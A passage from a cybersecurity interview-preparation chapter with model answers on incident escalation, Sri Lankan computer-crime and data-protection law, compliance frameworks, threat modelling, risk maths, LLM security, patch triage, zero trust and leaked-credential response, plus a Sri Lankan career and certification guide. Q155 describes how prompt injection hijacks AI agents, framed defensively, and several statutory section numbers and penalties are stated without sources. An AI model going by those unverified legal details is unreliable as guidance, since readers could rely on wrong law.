- **Answer:** **Purple Teaming** is a collaborative, transparent exercise where Red Team operators execute specific, documented adversary TTPs (mapped to MITRE ATT&CK) while working side-by-side with Blue Team Detection Engineers in real time. For each technique executed, the team records:
  1. **Telemetry Generated? (`Yes/No`):** Did Sysmon, `auditd`, EDR, or firewall logs capture the raw event locally?
  2. **Telemetry Forwarded? (`Yes/No`):** Did the log shipper deliver the event into the SIEM index?
  3. **Alert Triggered? (`Yes/No`):** Did a SIEM/EDR correlation rule fire an alert?
  4. **Blocked/Prevented? (`Yes/No`):** Did an inline control (EDR, ASR, WAF, IPS) block execution?
  This produces a measurable **MITRE ATT&CK Navigator Coverage Heatmap** tracking improvement from `0% Visibility` $\rightarrow$ `Logged` $\rightarrow$ `Alerted` $\rightarrow$ `Blocked`.

---

## 54.8 Section 8: Behavioral, Scenario, Governance & Sri Lankan Regulatory Questions (Questions 146–160)

**Q146. During an authorized penetration test of a production web application, you discover an RCE vulnerability and notice an unfamiliar `.aspx` web shell and outbound connection to an external IP that does NOT belong to your team. What do you do immediately?**
- **Answer:**
  1. **STOP active testing on that host immediately** so you do not overwrite forensic artifacts, alter timestamps, or tip off the active adversary.
  2. **Document everything passively:** Capture screenshots, exact timestamps (UTC), the full HTTP request/response, the file path and timestamp of the unknown web shell, and the foreign IP/port without modifying or deleting the artifact.
  3. **Trigger Emergency Escalation Protocol:** Contact your Engagement Lead and the Client CISO / Point of Contact immediately via phone and encrypted communication channel as defined in the Rules of Engagement, transitioning the engagement from a penetration test to supporting the client's Incident Response team.

**Q147. A senior software architect argues that fixing a High-severity internal vulnerability (`FND-006: Unsafe Java Deserialization on Internal VLAN`) is unnecessary because "the service is behind our perimeter firewall and only reachable on the internal network." How do you respond?**
- **Answer:** Acknowledge the perimeter firewall as one layer of control, then explain **Zero-Trust and Assumed-Breach principles** using concrete business impact: perimeter controls do not stop an attacker who gains an initial foothold via a phishing email on an employee laptop, a compromised VPN credential, an SSRF vulnerability on a public web server, or a malicious insider. Once inside the internal network, an unauthenticated RCE on an internal server allows the attacker to pivot directly into core databases and Domain Controllers. Offer two pragmatic options: (1) the 10-line `ObjectInputFilter` code patch (low engineering effort, permanent fix), combined with (2) host-level firewall rules restricting port `9090` strictly to the specific IP of the authorized upstream server.

**Q148. What are the core provisions and penalties of the Sri Lanka Computer Crimes Act No. 24 of 2007?**
- **Answer:** The **Computer Crimes Act No. 24 of 2007** is the primary statutory framework criminalizing unauthorized computer access and cyber offenses in Sri Lanka, possessing **extraterritorial jurisdiction** if either the offender, the victim computer, or the impact is within Sri Lanka:
  - **Section 3:** Securing unauthorized access to a computer (`Hacking`).
  - **Section 4:** Securing unauthorized access to a computer with intent to commit an offense.
  - **Section 5:** Causing a computer to perform a function without lawful authority (unauthorized modification, malware deployment, DoS/DDoS).
  - **Section 6:** Offenses committed against **National Security, Public Order, or Essential Services** (carries severe imprisonment penalties of not less than 5 years and up to 10+ years).
  - **Section 7:** Dealing with unlawfully obtained data (possessing, selling, or distributing leaked databases/credentials).
  - **Section 8, 9, 10:** Illegal interception of data in transit, using/possessing hacking devices/passwords for committing offenses, and abetment/conspiracy.
  - **Key Takeaway for Security Professionals:** Never run port scans, vulnerability checks, or exploit verification against any system without a **signed, written Rules of Engagement / Authorization Letter** from the legal system owner.

**Q149. Explain the Sri Lanka Personal Data Protection Act (PDPA) No. 9 of 2022 and its technical mandates for Data Controllers and Processors.**
- **Answer:** Modeled closely on the EU GDPR and enforced by the **Data Protection Authority (DPA) of Sri Lanka**, the **PDPA No. 9 of 2022** mandates:
  1. **Lawfulness, Purpose Limitation, and Data Minimization (Sections 5–8):** Personal data may only be processed for specified, explicit, and legitimate purposes.
  2. **Security of Processing (Section 10):** Controllers and Processors must implement appropriate technical and organizational measures—specifically **Encryption at rest and in transit, Pseudonymization/Tokenization, Role-Based Access Control, and regular Security Assessments/Penetration Testing**.
  3. **Personal Data Breach Notification (Section 23):** Mandatory notification to the Data Protection Authority (and affected Data Subjects where high risk exists) within strict statutory timeframes upon discovering a breach.
  4. **Data Protection Officer (DPO, Section 20) & Data Protection Impact Assessments (DPIA, Section 24):** Mandatory for large-scale processing of sensitive personal data (financial, biometric, health) or systematic monitoring.
  5. **Administrative Penalties (Section 38):** Fines of up to **LKR 10 Million** per violation for initial non-compliance, doubling on subsequent violations.

**Q150. What are the key cybersecurity requirements of the Central Bank of Sri Lanka (CBSL) Baseline Security Standard and Technology Risk Management Direction for Licensed Banks and Financial Institutions?**
- **Answer:** Issued by the Central Bank of Sri Lanka (and coordinated with **FinCSIRT**), the regulatory framework requires all Licensed Commercial Banks (LCBs), Licensed Specialized Banks (LSBs), and Finance Companies to enforce:
  1. **Independent Annual Penetration Testing & Vulnerability Assessments:** Conducted at least annually and prior to launching any major digital banking system or API.
  2. **24x7x365 Security Operations Center (SOC) & SIEM Monitoring:** Continuous real-time monitoring of critical banking infrastructure, SWIFT/LankaPay gateways, and privileged accounts with immutable log retention.
  3. **Multi-Factor Authentication (MFA) & Privileged Access Management (PAM):** Mandatory MFA for all remote access, cloud consoles, and administrative actions, backed by a PAM vault recording privileged sessions.
  4. **Incident Reporting to FinCSIRT / CBSL:** Mandatory rapid reporting of significant cyber incidents affecting financial stability or customer data.
  5. **ISO/IEC 27001 Certification & PCI-DSS Compliance:** Mandatory for institutions handling payment cards and digital financial channels.

**Q151. Compare ISO/IEC 27001:2022, SOC 2 Type II, PCI-DSS v4.0, and the NIST Cybersecurity Framework (CSF) 2.0.**
- **Answer:**
  - **ISO/IEC 27001:2022:** International certifiable standard specifying requirements for an **Information Security Management System (ISMS)** across 93 Annex A controls organized into 4 themes: *Organizational (37), People (8), Physical (14), and Technological (34)*.
  - **SOC 2 Type II (AICPA):** Attestation report audited by a CPA firm evaluating whether an organization's controls operated effectively over a **6-to-12 month observation period** across the 5 Trust Services Criteria (*Security, Availability, Processing Integrity, Confidentiality, Privacy*).
  - **PCI-DSS v4.0:** Mandatory prescriptive technical standard for any entity storing, processing, or transmitting cardholder data (CHD), mandating network segmentation of the Cardholder Data Environment (CDE), strong cryptography, authenticated internal/external ASV scans, penetration testing, and client-side payment page script integrity (`Requirement 6.4.3`).
  - **NIST CSF 2.0:** Risk-based framework structured around **6 Core Functions**: **`Govern`** (added in 2.0), **`Identify`**, **`Protect`**, **`Detect`**, **`Respond`**, and **`Recover`**.

**Q152. Explain the STRIDE Threat Modeling methodology and how you apply it during an architecture design review.**
- **Answer:** Developed by Microsoft, **STRIDE** systematically evaluates every component, data store, process, and trust boundary in a Data Flow Diagram (DFD) against six threat categories:
  - **S — Spoofing Identity** (Violates *Authentication* $\rightarrow$ Mitigate with MFA, mTLS, WebAuthn).
  - **T — Tampering with Data** (Violates *Integrity* $\rightarrow$ Mitigate with Digital Signatures, HMAC, AEAD, DB ACLs).
  - **R — Repudiation** (Violates *Non-Repudiation* $\rightarrow$ Mitigate with immutable audit logs, cryptographic signing).
  - **I — Information Disclosure** (Violates *Confidentiality* $\rightarrow$ Mitigate with TLS 1.3, AES-256-GCM at rest, BOLA checks).
  - **D — Denial of Service** (Violates *Availability* $\rightarrow$ Mitigate with rate limiting, WAF/CDN, resource quotas, connection pooling).
  - **E — Elevation of Privilege** (Violates *Authorization* $\rightarrow$ Mitigate with RBAC/ABAC, least privilege, sandboxing).

**Q153. Differentiate between RTO (Recovery Time Objective) and RPO (Recovery Point Objective) in Business Continuity & Disaster Recovery (BCDR).**
- **Answer:**
  - **RPO (Recovery Point Objective — Measured backwards in time):** The **maximum acceptable age of data loss** measured in time when a disaster occurs. If $\text{RPO} = 15\text{ minutes}$, database transaction log replication/backups must occur at least every 15 minutes.
  - **RTO (Recovery Time Objective — Measured forwards in time):** The **maximum acceptable downtime** after an outage begins before critical business services must be restored to operation. If $\text{RTO} = 1\text{ hour}$, the organization requires automated hot/warm standby failover rather than manual tape restoration.

**Q154. What is the difference between Qualitative and Quantitative Risk Assessment (`ALE = SLE × ARO` / `FAIR`)?**
- **Answer:**
  - **Qualitative Risk Assessment:** Uses ordinal categories (`Likelihood: High/Medium/Low` $\times$ `Impact: High/Medium/Low` $\rightarrow$ Risk Matrix). Fast and intuitive, but subjective.
  - **Quantitative Risk Assessment (Factor Analysis of Information Risk — `FAIR`):** Expresses risk in concrete financial currency (`USD` / `LKR`) to evaluate security investment ROI:
    - $\text{SLE (Single Loss Expectancy)} = \text{Asset Value (AV)} \times \text{Exposure Factor (EF)}$
    - $\text{ALE (Annualized Loss Expectancy)} = \text{SLE} \times \text{ARO (Annualized Rate of Occurrence)}$

**Q155. How do you secure an organization against AI / Large Language Model (LLM) application vulnerabilities (OWASP Top 10 for LLM Applications)?**
- **Answer:**
  1. **Direct & Indirect Prompt Injection (`LLM01`):** An attacker embeds malicious instructions inside user input or inside external documents/emails/webpages retrieved via **RAG (Retrieval-Augmented Generation)**. **Defense:** Never grant an LLM agent direct, unvalidated execution privileges (`Agency`). Enforce strict **Human-in-the-Loop (HITL)** confirmation for state-changing tool calls, separate system instructions from untrusted retrieved data using structured delimiters, and enforce deterministic RBAC on the underlying APIs/databases using the **invoking user's identity token** (so the LLM cannot query RAG documents the user is unauthorized to read).
  2. **Insecure Output Handling (`LLM02`):** Treat all LLM-generated output as **untrusted user input**—apply HTML output encoding/DOMPurify before rendering in a browser (preventing XSS via markdown/HTML generation) and use parameterized queries if generating SQL.

**Q156. How do you prioritize patching when a vulnerability scanner reports 5,000 CVEs across your enterprise infrastructure?**
- **Answer:** Relying on CVSS Base Score alone fails because over 55% of all published CVEs have a CVSS score $\ge 7.0$, yet fewer than 5% are ever exploited in the wild. Prioritize using a **4-Factor Risk-Based Vulnerability Management (RBVM)** formula:
  1. **Active Exploitation in the Wild:** Is the CVE listed in the **CISA Known Exploited Vulnerabilities (KEV) Catalog**?
  2. **Exploit Prediction Scoring System (`EPSS`):** Does the CVE have a high probability ($\text{EPSS} > 0.20$) of being exploited in the next 30 days, or public PoC weaponization in Metasploit/Nuclei?
  3. **Asset Exposure & Reachability:** Is the asset internet-facing (`External Perimeter`) or reachable on a critical path?
  4. **Business Criticality & Data Sensitivity:** Does the asset belong to Tier 0 (Domain Controllers, IdP) or process regulated PII/PCI financial data?

**Q157. Walk through how you would design a Zero-Trust Architecture (NIST SP 800-207) for a modern hybrid enterprise.**
- **Answer:** Zero Trust eliminates implicit trust based on network location (*"Never Trust, Always Verify; Assume Breach"*):
  1. **Identity Pillar:** Phishing-resistant MFA (**FIDO2/WebAuthn Passkeys**), centralized SSO (OIDC/SAML), and continuous risk-based conditional access.
  2. **Device Pillar:** Device posture verification (MDM/EDR healthy, disk encrypted, OS patched, corporate client certificate in TPM) required before granting access to any application.
  3. **Network / Access Proxy Pillar:** Replace split-tunnel network VPNs with **Identity-Aware Proxies (IAP / ZTNA)** that authenticate and authorize every single HTTP/SSH/RDP request at the application layer, combined with internal micro-segmentation (`Service Mesh mTLS` + host firewalls).
  4. **Data & Visibility Pillar:** Least-privilege RBAC/ABAC, data encryption at rest/in transit, and centralized SIEM/XDR telemetry across all pillars.

**Q158. During an incident or security review, a developer accidentally committed a production AWS `SecretAccessKey` to a public GitHub repository 10 minutes ago and just ran `git push --force` to remove it. Is the incident resolved? What steps do you take?**
- **Answer:** **No — the secret is 100% compromised.** Automated bots monitor the public GitHub Events API and clone every public commit within **seconds** of push; `git push --force` does not erase the leaked key from attacker bots or GitHub's cached commit objects (`https://github.com/org/repo/commit/<sha>`). **Immediate Steps:**
  1. **Revoke & Deactivate (`iam:DeleteAccessKey`) the exposed AWS key immediately** (within < 2 minutes).
  2. **Hunt AWS CloudTrail Logs** across all regions from the moment of commit until revocation for any calls made by that `AccessKeyId` (checking `sts:GetCallerIdentity`, `iam:CreateUser`, `iam:CreateAccessKey`, `s3:GetObject`, `ec2:RunInstances`, or `lambda:*`).
  3. Migrate the workflow to **GitHub Actions OIDC Federation** so static AWS keys are never used again.

**Q159. How do you explain a complex technical vulnerability (such as Kerberoasting or a GraphQL BOLA flaw) to a non-technical CEO or Board Member in 60 seconds?**
- **Answer:** Translate technical mechanics into **business risk, likelihood, and remediation cost**:
  *"In our digital banking API, when a customer logs in, the system checks THAT they are logged in, but fails to verify WHICH account number they are asking to view—meaning any customer who changes a single number in their browser request can view another customer's financial statements and API keys. This creates immediate regulatory exposure under the Personal Data Protection Act (PDPA) and Central Bank directives. Our engineering team can deploy a 10-line authorization check today with zero customer downtime to permanently close this risk."*

**Q160. What distinguishes an elite, senior cybersecurity engineer or penetration tester from a beginner who only runs automated tools?**
- **Answer:** Automated scanners find known signatures; an elite cybersecurity engineer understands **first-principles systems architecture**—how TCP/IP packets, OS kernels, CPU memory layouts, compilers, database transaction isolation levels, cryptographic primitives, and Active Directory protocols actually work under the hood. They can read and patch production source code across multiple languages, chain low-severity architectural quirks into critical business-logic proofs-of-concept, write high-fidelity behavioral detection rules (Sigma/YARA/eBPF) that survive attacker obfuscation, and communicate findings with clarity, integrity, and actionable engineering precision.

---

## 54.9 The Sri Lankan & Global Cybersecurity Career Engineering Guide

### 54.9.1 The Sri Lankan Cybersecurity Ecosystem & Regulatory Landscape
Sri Lanka boasts one of South Asia's most mature and rapidly expanding cybersecurity talent ecosystems, serving both domestic critical national infrastructure and global Fortune 500 engineering hubs.

1. **National & Sectoral Agencies:**
   - **Sri Lanka CERT|CC (Computer Emergency Readiness Team | Coordination Centre):** National center for cyber incident response, national infrastructure defense, and public security advisories (`cert.gov.lk`).
   - **FinCSIRT (Financial Sector Computer Security Incident Response Team):** Specialized CSIRT operating under the aegis of the Central Bank of Sri Lanka (CBSL) and LankaPay for banks and financial institutions.
   - **Data Protection Authority (DPA) of Sri Lanka:** Regulatory authority enforcing the Personal Data Protection Act (PDPA) No. 9 of 2022.
   - **Military & National Defense Cyber Commands:** Tri-Forces Cyber Security operations (Sri Lanka Army Signal Corps Cyber Security Operations, Sri Lanka Navy, Sri Lanka Air Force Cyber Operations) and TRC-SL.

2. **Leading Cybersecurity Employers in Sri Lanka:**
   - **Dedicated Cybersecurity Advisories, MSSPs & MDR Providers:** CryptoGen,TechCERT (Division of LK Domain Registry), CICRA Consultancies, SentryLabs, TekSek Cyber Security, Forensiq, WatchGuard/Fortinet/Palo Alto regional partners, and Big Four Risk Advisory practices (**PwC Sri Lanka**, **Deloitte**, **EY GDS Sri Lanka**, **KPMG Sri Lanka**, **BDO**).
   - **Global Product Engineering & Telco/FinTech Hubs in Colombo:** **WSO2** (Identity & Access Management / API Security), **LSEG (London Stock Exchange Group — Sri Lanka)**, **Sysco LABS**, **IFS**, **Virtusa**, **99x**, **Wiley**, **PickMe**, **Dialog Axiata**, **SLT-Mobitel**, **LankaPay**, and **Commercial Bank / HNB / Sampath Bank / Nations Trust Bank** Cyber Defense Centers.

3. **Academic & Community Pathways in Sri Lanka:**
   - **University Degree Programs:** University of Moratuwa (UOM — CSE & IT), University of Colombo School of Computing (UCSC — Master of Information Security / BSc CS), SLIIT (BSc Hons in Information Technology specializing in Cyber Security), NSBM Green University, IIT (Informatics Institute of Technology), APIIT, KDU (General Sir John Kotelawala Defence University), University of Peradeniya, University of Kelaniya, and University of Sri Jayewardenepura.
   - **Community & CTF Competitions:** ISACA Sri Lanka Chapter, (ISC)² Colombo Chapter, OWASP Colombo Chapter, HackTheBox Sri Lanka Meetups, CyberZee, Yarl Geek Challenge, and MoraXtreme / UCSC CTF competitions.

### 54.9.2 Career Tracks, Technical Competencies & Certification Roadmaps

| Career Track | Core Technical Stack to Master | Entry / Associate Certifications | Advanced / Senior Certifications |
| :--- | :--- | :--- | :--- |
| **Offensive Security / Penetration Tester / Red Teamer** | HTTP/2, Burp Suite Pro, Active Directory (`BloodHound`, `Impacket`, `NetExec`), Linux/Windows Internals, Python/C#/Go tool development, EDR Evasion. | `eJPT`, `PNPT` (TCM), `CPTS` (Hack The Box), `BSCP` (PortSwigger) | **`OSCP`**, `OSEP`, `OSWE`, `OSED`, `CRTO` (Zero-Point Security), `CREST CRT/CCT` |
| **Application Security (AppSec) / Product Security Engineer** | Secure Code Review (Java, Python, TypeScript/Node, Go, C#), SAST (`Semgrep`, `CodeQL`), DAST, Threat Modeling (`STRIDE`), OAuth 2.0/OIDC, Cryptography. | `BSCP` (Burp Suite Certified Practitioner), `CAPen`, `CKAD` | **`OSWE`**, `CSSLP`, `GWEB`, `CASE` |
| **Cloud & DevSecOps Security Engineer** | AWS/Azure/GCP IAM, Kubernetes (`EKS`/`GKE`), Docker, Terraform/IaC Security, CI/CD OIDC, `Cilium`/`Falco` eBPF, `Sigstore Cosign`. | `AWS Solutions Architect Assoc`, `CKA` (Certified Kubernetes Admin) | **`CKS` (Certified Kubernetes Security Specialist)**, **`AWS Certified Security - Specialty`**, `AZ-500`, `CCSP` |
| **Blue Team / SOC Analyst / Detection Engineer / DFIR** | Windows Event Logs, Sysmon, `auditd`, SIEM (`Splunk`, `Sentinel`, `Elastic`, `Wazuh`), Sigma, YARA, Suricata, `Velociraptor`, `Volatility 3`, Ghidra. | `BTL1` (Security Blue Team), `CCD` (Certified CyberDefender), `CDSA` (HTB) | **`GCFA`**, **`GREM`**, **`GCIH`**, `BTL2`, `OSDA` |
| **Security Architecture, GRC & CISO Leadership** | ISO/IEC 27001:2022 Lead Implementer/Auditor, NIST CSF 2.0, PDPA / GDPR, PCI-DSS v4.0, Enterprise Risk Quantification (`FAIR`), Zero-Trust Design. | `ISO 27001 Lead Auditor`, `Security+`, `SSCP` | **`CISSP`**, **`CISM`**, **`CISA`**, **`CRISC`**, `SABSA` |

### 54.9.3 Portfolio Engineering: Standing Out in Technical Interviews
In both Sri Lankan and international remote hiring processes, candidates who demonstrate **verifiable engineering output** consistently outperform those who list only theoretical coursework:
1. **Build an Enterprise Home Lab:** Deploy a multi-VM environment on Proxmox or local virtualization containing a Windows Server 2022 Domain Controller, two Windows 11/Server workstations, an Ubuntu Docker/Kubernetes host, and a centralized **Wazuh + Sysmon + Velociraptor** SIEM stack.
2. **Publish Technical Writeups & Detection Rules:** Document your lab research—show how a vulnerability works at the packet/syscall/source-code level, write the **Sigma / YARA detection rule** that catches it, and write the **secure code patch** that fixes it.
3. **Contribute to Open Source Security:** Submit nuclei templates, Semgrep rules, Sigma detections, or patches to open-source security projects, and participate actively in university CTFs, Hack The Box, PortSwigger Web Security Academy, and responsible vulnerability disclosure programs.
